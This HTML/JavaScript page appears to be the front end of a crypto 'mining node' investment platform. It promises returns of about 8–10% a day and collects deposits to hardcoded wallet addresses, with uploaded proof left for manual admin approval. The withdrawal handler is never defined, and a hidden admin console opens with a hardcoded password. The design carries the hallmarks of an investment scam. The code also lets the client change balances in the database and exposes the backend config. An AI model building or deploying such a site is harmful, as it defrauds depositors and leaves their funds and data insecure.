<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS PRO | Institutional Node Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        :root { --n-pink: #6366f1; --n-blue: #0ea5e9; --bg: #f8fafc; }
        body { background: var(--bg); color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 1); border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05); }
        .btn-gradient { background: linear-gradient(135deg, #6366f1, #0ea5e9); color: white; border-radius: 16px; font-weight: 800; transition: 0.3s; box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3); }
        .btn-gradient:active { transform: scale(0.95); }
        .input-light { background: #ffffff; border: 1.5px solid #e2e8f0; border-radius: 14px; padding: 14px; outline: none; transition: 0.3s; }
        .input-light:focus { border-color: var(--n-pink); box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1); }
        
        .nav-active { color: var(--n-pink) !important; transform: translateY(-5px); }
        .vip-badge { background: linear-gradient(90deg, #f59e0b, #ef4444); color: white; font-size: 8px; padding: 2px 8px; border-radius: 20px; font-weight: 900; }
        
        #splash { background: white; position: fixed; inset: 0; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .timer-box { font-family: monospace; font-weight: bold; background: #f1f5f9; padding: 2px 6px; border-radius: 6px; color: #64748b; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="splash">
        <div class="w-16 h-16 btn-gradient rounded-2xl flex items-center justify-center text-3xl font-black italic shadow-2xl">N</div>
        <h2 class="mt-4 font-black tracking-[4px] text-zinc-400 text-xs uppercase">Nexus Secure</h2>
    </div>

    <div id="dashboard" class="hidden pb-24">
        <header class="p-5 flex justify-between items-center sticky top-0 bg-white/70 backdrop-blur-xl z-50 border-b border-zinc-100">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 btn-gradient rounded-xl flex items-center justify-center text-xl font-black italic">N</div>
                <div>
                    <h1 class="text-sm font-extrabold text-zinc-900 leading-none">NEXUS<span class="text-indigo-600">PRO</span></h1>
                    <p id="nav-user" class="text-[10px] font-bold text-zinc-400 uppercase tracking-tighter italic">Connecting...</p>
                </div>
            </div>
            <div class="flex gap-2">
                <div class="w-10 h-10 rounded-full bg-zinc-100 flex items-center justify-center text-zinc-500"><i class="fa-solid fa-bell"></i></div>
                <div onclick="logout()" class="w-10 h-10 rounded-full bg-red-50 flex items-center justify-center text-red-500"><i class="fa-solid fa-power-off"></i></div>
            </div>
        </header>

        <main id="page-home" class="p-5 space-y-6">
            <div class="glass-card p-6 bg-gradient-to-br from-indigo-50 to-white border-none">
                <p class="text-[10px] font-black text-indigo-400 uppercase tracking-widest mb-1">Total Available Balance</p>
                <div class="flex items-baseline gap-1">
                    <span class="text-2xl font-bold text-indigo-900">$</span>
                    <h2 id="balance-txt" class="text-4xl font-black tracking-tighter text-indigo-900">0.00</h2>
                </div>
                <div class="grid grid-cols-2 gap-4 mt-8">
                    <div class="bg-white/50 p-3 rounded-2xl border border-white">
                        <p class="text-[8px] font-bold text-zinc-400 uppercase">Daily Profit</p>
                        <p id="profit-txt" class="text-lg font-black text-emerald-500">+$0.00</p>
                    </div>
                    <div class="bg-white/50 p-3 rounded-2xl border border-white text-right">
                        <p class="text-[8px] font-bold text-zinc-400 uppercase">Referral Bonus</p>
                        <p class="text-lg font-black text-indigo-500">$0.00</p>
                    </div>
                </div>
            </div>

            <div class="flex justify-between items-center px-1">
                <h3 class="font-black text-sm uppercase text-zinc-500">Active Mining Nodes</h3>
                <span class="text-[9px] font-bold bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">LIVE SYNC</span>
            </div>
            <div id="active-nodes-list" class="space-y-3"></div>
        </main>

        <main id="page-market" class="p-5 space-y-8 hidden">
            <section class="space-y-4">
                <div class="flex items-center gap-2 mb-2">
                    <i class="fa-solid fa-crown text-amber-500"></i>
                    <h3 class="font-black text-lg text-zinc-800 italic uppercase">VIP Sovereign Nodes</h3>
                </div>
                <div id="elite-nodes" class="grid gap-5"></div>
            </section>

            <section class="space-y-4">
                <div class="flex items-center gap-2 mb-2">
                    <i class="fa-solid fa-microchip text-indigo-500"></i>
                    <h3 class="font-black text-lg text-zinc-800 italic uppercase">Institutional Nodes</h3>
                </div>
                <div id="normal-nodes" class="grid gap-5 pb-20"></div>
            </section>
        </main>

        <main id="page-vault" class="p-5 space-y-6 hidden">
            <div class="glass-card p-6">
                <h3 class="font-black uppercase text-zinc-800 mb-4 flex items-center gap-2"><i class="fa-solid fa-arrow-down text-emerald-500"></i> Deposit Equity</h3>
                <select id="dep-method" class="input-light w-full mb-4 font-bold text-sm" onchange="updateDepAddr()">
                    <option value="">Choose Settlement Method</option>
                    <option value="USDT_TRC20">USDT (TRC20 Protocol)</option>
                    <option value="TRX">TRON (TRX Native)</option>
                    <option value="BNB">BNB (Smart Chain)</option>
                </select>
                <div id="dep-details" class="hidden space-y-4 animate-in fade-in slide-in-from-top-2">
                    <div class="p-4 bg-zinc-50 rounded-2xl border border-zinc-100 text-center">
                        <p id="dep-addr-display" class="text-[10px] font-mono break-all text-indigo-600 font-bold select-all"></p>
                        <p class="text-[8px] text-zinc-400 mt-2 uppercase font-black">Tap address to copy</p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-light w-full">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash / TID" class="input-light w-full">
                    <div class="p-4 border-2 border-dashed border-zinc-100 rounded-2xl text-center">
                        <input type="file" id="dep-proof" accept="image/*" class="hidden">
                        <label for="dep-proof" class="cursor-pointer">
                            <i class="fa-solid fa-cloud-arrow-up text-zinc-300 text-2xl mb-2"></i>
                            <p class="text-[10px] font-black text-zinc-500 uppercase">Upload Settlement Proof</p>
                        </label>
                    </div>
                    <button onclick="processDeposit()" class="btn-gradient w-full py-4">Verify Settlement</button>
                </div>
            </div>

            <div class="glass-card p-6">
                <h3 class="font-black uppercase text-zinc-800 mb-4 flex items-center gap-2"><i class="fa-solid fa-arrow-up text-red-500"></i> Capital Withdrawal</h3>
                <div class="space-y-4">
                    <select id="with-method" class="input-light w-full font-bold text-sm">
                        <option value="Binance">Binance Pay</option>
                        <option value="USDT">USDT (TRC20)</option>
                        <option value="TrustWallet">Trust Wallet</option>
                        <option value="PayPal">PayPal</option>
                        <option value="Bank">Bank Transfer</option>
                    </select>
                    <input type="text" id="w-user" placeholder="Account Identifier" class="input-light w-full">
                    <input type="text" id="w-addr" placeholder="Destination Address" class="input-light w-full">
                    <input type="number" id="w-amt" placeholder="Amount ($)" class="input-light w-full">
                    <button onclick="processWithdraw()" class="btn-gradient w-full py-4 !from-zinc-800 !to-zinc-900">Initialize Payout</button>
                </div>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-5 bg-white/80 backdrop-blur-2xl border-t border-zinc-100 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active flex flex-col items-center">
                <i class="fa-solid fa-house-chimney text-xl"></i>
                <span class="text-[8px] font-black mt-1 uppercase">Home</span>
            </div>
            <div onclick="switchPage('market')" class="nav-item flex flex-col items-center">
                <i class="fa-solid fa-microchip text-xl"></i>
                <span class="text-[8px] font-black mt-1 uppercase">Nodes</span>
            </div>
            <div onclick="switchPage('vault')" class="nav-item flex flex-col items-center">
                <i class="fa-solid fa-wallet text-xl"></i>
                <span class="text-[8px] font-black mt-1 uppercase">Vault</span>
            </div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-slate-50 z-[10000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-indigo-900 uppercase italic">System Console</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl text-zinc-400">&times;</button>
        </div>
        <div class="space-y-6">
            <div id="admin-requests" class="grid gap-4"></div>
            <div id="admin-users" class="grid gap-2"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // NODE MARKET DATA
        const eliteNodes = [
            { id: 101, title: "Sovereign Prime", price: 1500, daily: 120, total: 3600, days: 30, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=400" },
            { id: 102, title: "Global Nexus", price: 3000, daily: 260, total: 7800, days: 30, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&w=400" },
            { id: 103, title: "Imperial Core", price: 5000, daily: 450, total: 13500, days: 30, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?auto=format&fit=crop&w=400" },
            { id: 104, title: "Alpha Sentinel", price: 10000, daily: 1000, total: 30000, days: 30, img: "https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=400" }
        ];
        
        const normalNodes = Array.from({length: 12}, (_, i) => ({
            id: i+1, title: `Retail Node N-${i+1}`, price: 50 + (i*80), daily: 4 + (i*7), total: (4 + (i*7))*30, days: 30, img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?auto=format&fit=crop&w=200&sig=${i}`
        }));

        window.onload = () => {
            renderMarket();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u); else location.href = "login.html"; 
            }, 2000);
            startGlobalTimer();
        };

        function renderMarket() {
            document.getElementById('elite-nodes').innerHTML = eliteNodes.map(n => nodeCard(n, true)).join('');
            document.getElementById('normal-nodes').innerHTML = normalNodes.map(n => nodeCard(n, false)).join('');
        }

        const nodeCard = (n, isVip) => `
            <div class="glass-card overflow-hidden group">
                <div class="relative h-32">
                    <img src="${n.img}" class="w-full h-full object-cover">
                    <div class="absolute inset-0 bg-gradient-to-t from-white via-transparent"></div>
                    ${isVip ? `<span class="absolute top-3 left-3 vip-badge">VIP SPECIAL</span>` : ''}
                </div>
                <div class="p-5 -mt-6 relative">
                    <h4 class="font-extrabold text-zinc-900">${n.title}</h4>
                    <div class="grid grid-cols-2 gap-2 mt-4">
                        <div class="text-[9px] font-black text-zinc-400 uppercase">Daily: <span class="text-emerald-500">$${n.daily}</span></div>
                        <div class="text-[9px] font-black text-zinc-400 uppercase text-right">Total: <span class="text-indigo-600">$${n.total}</span></div>
                    </div>
                    <div class="flex justify-between items-center mt-6">
                        <span class="text-xl font-black text-zinc-800">$${n.price}</span>
                        <button onclick="buyNode(${n.id})" class="btn-gradient px-6 py-2 text-[10px] uppercase">Activate</button>
                    </div>
                </div>
            </div>`;

        window.buyNode = async (nodeId) => {
            const u = localStorage.getItem('nexus_user');
            const node = [...eliteNodes, ...normalNodes].find(n => n.id === nodeId);
            const userSnap = await get(ref(db, `users/${u}`));
            const d = userSnap.val();
            
            if (d.balance >= node.price) {
                const nodeKey = push(ref(db, `users/${u}/nodes`)).key;
                await update(ref(db, `users/${u}`), { balance: d.balance - node.price });
                await set(ref(db, `users/${u}/nodes/${nodeKey}`), { ...node, purchaseDate: Date.now(), nextClaim: Date.now() + 86400000 });
                alert("Sweetie! Node Activated! 🚀");
            } else { alert("Insufficient Balance!"); switchPage('vault'); }
        };

        function startGlobalTimer() {
            setInterval(() => {
                document.querySelectorAll('.countdown-timer').forEach(el => {
                    const next = parseInt(el.dataset.next);
                    const diff = next - Date.now();
                    if(diff <= 0) { el.innerText = "CLAIMING..."; location.reload(); }
                    else {
                        const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                        el.innerText = `${h}h ${m}m ${s}s`;
                    }
                });
            }, 1000);
        }

        window.processDeposit = () => {
            const file = document.getElementById('dep-proof').files[0];
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const u = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const data = { id: hKey, user: u, amount: document.getElementById('dep-amt').value, tid: document.getElementById('dep-tid').value, proof: reader.result, method: document.getElementById('dep-method').value, type: 'Deposit', status: 'Pending', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), data);
                alert("Protocol Initialized! Pending Verification. 💋");
                switchPage('home');
            };
        };

        function showDashboard(uid) {
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = `ID: ${uid}`;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => {
                    return `
                        <div class="glass-card p-4 flex justify-between items-center border-l-4 border-indigo-500">
                            <div>
                                <p class="text-[10px] font-black uppercase text-zinc-900">${n.title}</p>
                                <p class="text-[8px] font-bold text-zinc-400">Profit: $${n.daily}/day</p>
                            </div>
                            <div class="text-right">
                                <p class="text-[8px] font-black text-indigo-400 uppercase mb-1">Next Payout</p>
                                <span class="countdown-timer timer-box text-[10px]" data-next="${n.nextClaim}">--:--:--</span>
                            </div>
                        </div>`;
                }).join('') || '<p class="text-center text-[9px] font-black py-10 text-zinc-300 uppercase tracking-widest">No Active Nodes Found</p>';
            });
        }

        // --- CORE UTILS ---
        window.switchPage = (p) => {
            ['home','market','vault'].forEach(x => document.getElementById('page-'+x).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        };
        window.updateDepAddr = () => {
            const addrs = { USDT_TRC20: 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ', TRX: 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76', BNB: '0xD9359EADE5F5bACA51fb7da043767Bc0685bC355' };
            const m = document.getElementById('dep-method').value;
            if(m) { document.getElementById('dep-addr-display').innerText = addrs[m]; document.getElementById('dep-details').classList.remove('hidden'); }
        };
        window.logout = () => { localStorage.clear(); location.href="login.html"; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Auth:") === "coin786") document.getElementById('admin-panel').classList.remove('hidden'); taps = 0; } };
    </script>
</body>
</html>
